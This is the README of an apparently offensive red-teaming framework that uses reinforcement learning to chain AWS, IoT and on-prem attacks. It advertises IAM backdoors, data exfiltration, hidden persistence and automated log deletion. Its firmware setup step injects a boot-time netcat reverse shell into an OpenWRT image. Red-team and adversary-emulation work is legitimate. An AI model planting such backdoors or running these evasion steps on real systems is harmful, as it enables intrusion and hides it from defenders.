# 🛡️ AI Attack Simulation Framework

**Author:** Kaycee1771  
**Version:** 1.0  
**License:** MIT  
**Repository:** [GitHub Link](https://github.com/kaycee1771/AI_attack)

---

## 🔴 Overview

**AI-Driven Automated Attack Simulation Framework** is a **red teaming automation tool** that integrates **AI-based attack path optimization, MITRE ATT&CK tactics, and adversary emulation** for **Cloud (AWS), IoT, and On-Prem** environments.  
This framework simulates **real-world cyber attacks** using **machine learning (Reinforcement Learning), adversary emulation (MITRE Caldera & Atomic Red Team), and IoT exploit automation**.

🔥 **Why This Project?**
- **Automates Red Teaming**: Simulate **real** attack paths without manual effort.
- **AI-Powered Optimization**: Uses **Reinforcement Learning (PPO, Q-learning)** to choose optimal attack vectors.
- **Cloud & IoT Attacks**: Supports AWS privilege escalation, lateral movement, and IoT firmware backdoors.
- **Adversary Emulation**: Uses **MITRE ATT&CK tactics** to test real security defenses.
- **Automated Forensics Evasion**: Clears logs and hides traces post-attack.

---

## ⚔️ Features

✅ **AI-Based Attack Path Optimization** (Reinforcement Learning)  
✅ **Automated Cloud Exploitation (AWS Privilege Escalation, IAM Backdoors, Data Exfiltration)**  
✅ **IoT Firmware Backdoor Injection & Secure Boot Bypass**  
✅ **MITRE ATT&CK-Based Adversary Emulation (Caldera, Atomic Red Team)**  
✅ **Automated Log Deletion & Evasion**  
✅ **Persistence Mechanisms (Backdoor Users, Hidden SSH Access)**  
✅ **Full Logging & Report Generation (CSV, JSON, ATT&CK Heatmap)**  

---

## 🛠️ Tools & Technologies

| Component                | Functionality |
|--------------------------|--------------|
| **AI Model (Reinforcement Learning)** | Attack path optimization (PPO, Q-learning) |
| **AWS Pacu** | Cloud privilege escalation, backdoor injection, S3/RDS/EBS extraction |
| **IoT Firmware Backdoor** | OpenWRT-based firmware injection & Secure Boot bypass |
| **MITRE Caldera** | Adversary emulation, automated attack execution |
| **Atomic Red Team** | Windows/Linux/Mac local privilege escalation, credential dumping |
| **Binwalk & QEMU** | IoT firmware analysis, modification, and deployment |
| **Suricata** | Network intrusion detection for monitoring attacks |
| **Grafana & OpenSearch** | Attack data visualization & logging |
| **Python, PyTorch, OpenAI Gym** | AI-based attack decision-making |

---

## 📁 Project Structure

```plaintext
AI_ATTACK_SIMULATION/
🔹 _openwrt-24.10.0-x86/         # Extracted IoT firmware for backdoor injection
🔹 atomic-red-team/              # Windows/Linux/Mac attack simulation
🔹 backdoor_firmware/            # Modified IoT firmware with embedded reverse shell
🔹 caldera/                      # MITRE Caldera Adversary Emulation
🔹 envs/                         # AI environment for reinforcement learning
🔹 logs/                         # Attack execution logs
🔹 models/                       # Trained AI models for attack decision-making
🔹 pacu/                         # AWS exploitation framework
🔹 aws_exploit.py                # Automated AWS privilege escalation attack script
🔹 backdoor_firmware.qcow2        # IoT backdoor firmware ready for deployment
🔹 iot_exploit.py                 # IoT firmware modification & injection
🔹 mitre_mapper.py                # Generates MITRE ATT&CK Heatmaps
🔹 openwrt_boot.qcow2             # OpenWRT virtualized IoT firmware test environment
🔹 run_simulation.py              # Main script to execute full attack simulation
🔹 train_ai.py                    # AI training script for attack optimization
🔹 requirements.txt               # Required Python dependencies
🔹 setup.cfg                      # Project configuration
🔹 README.md                      # This documentation
```

---

## 🚀 Installation & Setup

### **1️⃣ Clone the Repository**
```bash
git clone https://github.com/kaycee1771/AI_attack.git
cd AI_attack_simulation
```

### **2️⃣ Install Dependencies**
```bash
pip install -r requirements.txt
```

### **3️⃣ Setup AWS Pacu**
```bash
cd pacu
python3 cli.py
```
Then set up AWS keys:
```bash
set_keys
```

### **4️⃣ Setup MITRE Caldera**
```bash
cd caldera
python3 server.py --insecure
```

### **5️⃣ Setup Atomic Red Team**
```powershell
Install-Module Invoke-AtomicRedTeam -Force
```
Check available tests:
```powershell
Invoke-AtomicTest T1078.004
```

### **6️⃣ Prepare IoT Firmware**
```bash
binwalk -e openwrt-24.10.0.img
cd _openwrt-24.10.0.extracted
```
Inject backdoor:
```bash
echo '#!/bin/sh' > etc/init.d/backdoor
echo 'nc -e /bin/sh 192.168.1.100 4444' >> etc/init.d/backdoor
chmod +x etc/init.d/backdoor
```

---

## 💥 Running the Attack Simulation

### **1️⃣ Run Full AI-Automated Attack**
```bash
python3 run_simulation.py
```

### **2️⃣ Run Individual Components**
- **AWS Exploit**: `python3 aws_exploit.py`
- **IoT Exploit**: `python3 iot_exploit.py`
- **AI Training**: `python3 train_ai.py`
- **ATT&CK Mapping**: `python3 mitre_mapper.py`

---

## 📊 Report Generation & Logs
After execution, all attack logs will be stored in the **logs/** folder.  
Use the MITRE Mapper to generate a **heatmap**:
```bash
python3 mitre_mapper.py
```
Output:  
✅ `mitre_attack_heatmap.png`  
✅ `aws_attack_log.txt`  

---

## 🛑 Ethical Disclaimer
This project is strictly for **educational** and **research** purposes.  
**Do not** use this on unauthorized systems. **Pentesting requires legal permission.**  

---

## 💌 Support & Contributions
**Pull requests** are welcome! Feel free to contribute, suggest new features, or report issues.  
📩 **Contact:** [GitHub Issues](https://github.com/kaycee1771/AI_attack/issues)  

---

